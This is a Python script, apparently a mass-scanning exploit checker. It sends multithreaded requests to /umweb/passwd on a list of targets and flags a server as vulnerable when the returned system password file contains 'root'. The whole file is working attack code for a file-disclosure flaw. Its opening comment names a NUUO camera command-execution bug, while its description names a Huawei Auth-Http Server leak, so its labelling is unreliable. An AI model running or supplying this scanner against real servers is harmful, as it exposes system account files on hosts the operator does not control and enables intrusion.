import requests
import sys
import argparse
from multiprocessing.dummy import Pool

# NUUO摄像头远程命令执行漏洞
requests.packages.urllib3.disable_warnings()


def main():
    parse = argparse.ArgumentParser(description="Huawei Auth-Http Server 1.0 信息泄露")
    # 添加命令行参数
    parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    # 实例化
    args = parse.parse_args()
    pool = Pool(30)

    try:
        targets = []
        if args.url:
            targets.append(args.url)  # 如果有单个 URL，添加到列表
        elif args.file:
            with open(args.file, 'r') as f:
                for target in f.readlines():
                    target = target.strip()
                    if target:  # 确保不添加空行
                        # 增加协议
                        if not target.startswith(('http://', 'https://')):
                            target = 'http://' + target
                        targets.append(target)

        # 调用多线程去执行检测函数
        pool.map(check, targets)
    except Exception as e:
        print(f"[ERROR] 参数错误请使用-h查看帮助信息: {e}")


def check(target):
    target = f"{target}/umweb/passwd"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Te': 'trailers',
        'Connection': 'close',
    }

    try:
        response = requests.get(target, headers=headers, verify=False, timeout=3)
        if response.status_code == 200 and 'root' in response.text:
            print(f"[*] {target} Is Vulnerable")
        else:
            print(f"[!] {target} Not Vulnerable")
    except requests.exceptions.Timeout:
        print(f"[Error] {target} TimeOut")
    except requests.RequestException as e:
        print(f"[Error] {target} 请求失败: {e}")


if __name__ == '__main__':
    main()
